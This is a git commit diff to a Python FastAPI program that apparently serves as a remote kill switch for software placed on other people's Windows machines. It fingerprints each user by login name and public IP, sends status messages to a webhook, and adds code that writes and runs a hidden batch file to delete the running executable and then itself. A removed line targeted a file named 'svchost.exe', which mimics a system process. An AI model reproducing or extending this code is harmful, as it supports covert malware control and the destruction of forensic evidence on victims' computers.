7e8e4b360a6206b5b0627c800b8b5b4189f7a397
xinaiderf <bielschneider74@gmail.com>
2025-08-11 19:58:31 -0400

    adição de criação de .bat para exclusão do arquivo principal

--- kill.py
+++ kill.py
@@ -1,33 +1,65 @@
-from fastapi import FastAPI, HTTPException
-import uvicorn
+from fastapi import FastAPI, HTTPException, Header
 import os
 from dotenv import load_dotenv
 import requests
+import sys
+import subprocess
+from funcoes import identificar_usuario, send
 
+app = FastAPI()
 load_dotenv()
 
-ip_publico = requests.get('https://httpbin.org/ip').json()['origin']
-usuario = os.getlogin()
 
-user_identification = f'{usuario} - {ip_publico}'.lower().replace('.', '')
-
+## VARIAVEIS ##
 secret_token = os.getenv('SECRET_TOKEN')
-app = FastAPI()
-
+url = os.getenv('webhook_url_hhh')
 diretorio_arquivo = os.path.dirname(__file__)
-arquivo_kill = os.path.join(diretorio_arquivo, 'svchost.exe') 
 
-# Cria uma rota com a identificação do usuario para melhor organização
-@app.post(f'/{user_identification}')
-def destruir(token: str):
+
+# Identificação do usuario 
+user_identification = identificar_usuario()
+
+# Função para enviar notificações
+
+def kill():
+    send('Iniciando KILL')
+    exe_path = sys.executable  # caminho do exe atual
+    bat_path = os.path.join(diretorio_arquivo, 'del_self.bat')
+
+    with open(bat_path, 'w') as f:
+        f.write(f'''
+@echo off
+:loop
+tasklist /fi "imagename eq {os.path.basename(exe_path)}" | find /i "{os.path.basename(exe_path)}" >nul
+if not errorlevel 1 (
+    timeout /t 1 /nobreak >nul
+    goto loop
+)
+del "{exe_path}"
+del "%~f0"
+''')
+
+    # executa o bat em background
+    subprocess.Popen(['cmd', '/c', bat_path], shell=False)
+
+    send('KILL Finalizado')
+
+    os._exit(0)
+
+
+# Cria uma rota com a identificação do usuario para deletar somente esse usuario
+@app.post(f'/destruir/{user_identification}')
+def destruir(token: str = Header(...)):
     if token != secret_token:
         raise HTTPException(status_code=403, detail='ACESSO NEGADO MEU PATRÃO RSRS')
-    os.remove(arquivo_kill)
+
+    kill()
+
 
 # Rota de Delete All 
 @app.post('/kill-all')
-def destruir(token: str):
+def kill_all(token: str = Header(...)):
     if token != secret_token:
         raise HTTPException(status_code=403, detail='ACESSO NEGADO MEU PATRÃO RSRS')
     
-    os.remove(arquivo_kill)
+    kill()
